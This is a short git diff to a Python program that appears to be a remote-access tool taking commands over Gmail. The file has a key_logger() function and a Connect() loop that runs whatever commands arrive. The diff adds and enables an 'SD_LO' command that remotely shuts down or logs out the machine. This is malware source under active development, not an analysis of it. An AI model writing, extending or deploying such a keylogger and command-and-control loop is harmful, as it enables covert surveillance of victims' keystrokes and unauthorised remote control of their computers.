@@ -16,6 +16,7 @@ from email.mime.text import MIMEText
 from requests import HTTPError
 import k as kls
 import app_process_server_gmail as ap
+import shutdown_logout_server_gmail as sl
 
 # If modifying these scopes, delete the file token.json.
 SCOPES = [
@@ -144,6 +145,10 @@ def key_logger():
 def app_process():
     ap.app_process()
     return
+def shutdown_logout():
+    sl.shutdown_logout()
+    return
+
 
 def Connect():
     while True:
@@ -162,8 +167,8 @@ def Connect():
             app_process()       
         # elif "REGISTRY" in cmd:
         #     registry()
-        # elif "SD_LO" in cmd:
-        #     shutdown_logout() 
+        elif "SD_LO" in cmd:
+            shutdown_logout() 
 
 
 # def create_window():
